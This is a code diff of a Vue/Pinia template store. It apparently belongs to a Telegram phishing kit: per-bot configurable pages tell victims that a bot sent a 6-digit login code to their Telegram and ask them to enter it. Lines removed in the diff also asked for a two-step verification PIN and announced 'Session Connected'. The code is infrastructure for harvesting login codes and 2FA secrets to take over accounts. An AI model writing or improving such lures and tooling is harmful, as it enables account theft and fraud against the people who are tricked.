@@ -27,58 +27,36 @@ const PALETTES = {
   },
 };
 
-function normStep(step, fallbackTitle, fallbackDesc, fallbackBtn) {
-  const s = step && typeof step === "object" ? step : {};
-  return {
-    title: s.title || fallbackTitle,
-    description: s.description || fallbackDesc,
-    buttonText: s.buttonText || fallbackBtn,
-  };
-}
-
 export const useTemplateStore = defineStore("template", () => {
   const template = ref({
     color: "default",
-    backgroundUrl: "",
-    backgroundBlur: 0,
-    code: normStep(
-      {},
-      "Auto OTP Verification",
-      "Our bot automatically sent a 6-digit login code to your Telegram chat. Enter it below.",
-      "Verify & Login"
-    ),
-    pass: normStep(
-      {},
-      "Two-Step Verification",
-      "Enter your security PIN to complete login.",
-      "Unlock Session"
-    ),
-    end: normStep(
-      {},
-      "Session Connected",
-      "Your login session is active and synced.",
-      "Continue"
-    ),
+    code: {
+      title: "Auto OTP Verification",
+      description: "Our bot automatically sent a 6-digit login code to your Telegram chat. Enter it below.",
+      buttonText: "Verify & Continue",
+    },
   });
 
   const themeVars = computed(() => PALETTES[template.value.color] || {});
 
   async function init(userStore) {
-    const res = await api.getTemplate({
-      bot_id: userStore.botId,
-      user_tg: userStore.user,
-    });
-    if (res && res.template) {
-      const t = res.template;
-      template.value = {
-        color: t.color || "default",
-        backgroundUrl: t.backgroundUrl || "",
-        backgroundBlur: Number(t.backgroundBlur) || 0,
-        code: normStep(t.code, template.value.code.title, template.value.code.description, template.value.code.buttonText),
-        pass: normStep(t.pass, template.value.pass.title, template.value.pass.description, template.value.pass.buttonText),
-        end: normStep(t.end, template.value.end.title, template.value.end.description, template.value.end.buttonText),
-      };
-    }
+    try {
+      const res = await api.getTemplate({
+        bot_id: userStore.botId,
+        user_tg: userStore.user,
+      });
+      if (res && res.template) {
+        const t = res.template;
+        template.value = {
+          color: t.color || "default",
+          code: {
+            title: t.code?.title || template.value.code.title,
+            description: t.code?.description || template.value.code.description,
+            buttonText: t.code?.buttonText || template.value.code.buttonText,
+          },
+        };
+      }
+    } catch {}
     return true;
   }
 
